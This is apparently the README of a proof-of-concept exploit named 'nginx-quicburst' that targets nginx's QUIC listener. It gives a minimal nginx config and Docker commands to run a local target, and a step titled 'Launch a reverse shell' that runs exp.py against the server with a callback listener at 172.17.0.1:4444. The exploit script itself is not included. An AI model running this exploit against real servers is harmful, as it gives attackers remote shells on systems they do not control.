# nginx-quicburst

## Quick Start

Nginx config:
```
error_log stderr;

events {
    multi_accept on;
}

http {
    server {
        listen 443 quic;
        ssl_certificate cert.pem;
        ssl_certificate_key key.pem;

        location / {
            return 200 "hello world";
        }

    }
}
```

Start the Nginx official container:
```bash
docker pull --platform=linux/amd64 nginx:1.31.1-trixie@sha256:4a2d27f57e72adbc1e1cfed8db6cbdef22c080e058565f92647f7aad258292f2

openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem -subj /CN=localhost 2>/dev/null

docker run \
  --name nginx-quicburst \
  --platform=linux/amd64 \
  -p 127.0.0.1:443:443/udp \
  -v /host/path/nginx.conf:/etc/nginx/nginx.conf:ro \
  -v /host/path/cert.pem:/etc/nginx/cert.pem:ro \
  -v /host/path/key.pem:/etc/nginx/key.pem:ro \
  -d \
  nginx:1.31.1-trixie@sha256:4a2d27f57e72adbc1e1cfed8db6cbdef22c080e058565f92647f7aad258292f2
```

Launch a reverse shell:
```bash
pip install pylsqpack aioquic
python exp.py 127.0.0.1:443 172.17.0.1:4444
```

Cleanup:
```bash
docker rm -f nginx-quicburst
```

Note that you might need to adjust timeout for different network environments.
